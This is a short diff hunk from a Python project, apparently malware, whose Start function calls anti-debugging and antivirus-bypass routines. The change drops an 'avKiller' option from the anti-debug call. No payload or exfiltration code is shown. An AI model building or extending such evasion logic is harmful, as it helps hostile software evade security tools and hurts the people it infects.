@@ -45,7 +45,7 @@ from scripts.browsers import geckodriver
 
 def Start() -> None:
     if not Config.debuging:
-        antiDebug.AntiDebug(Config.oneStart,Config.avKiller)
+        antiDebug.AntiDebug(Config.oneStart)
         if Config.avbypass:
             avbypass.AvByPass()
 
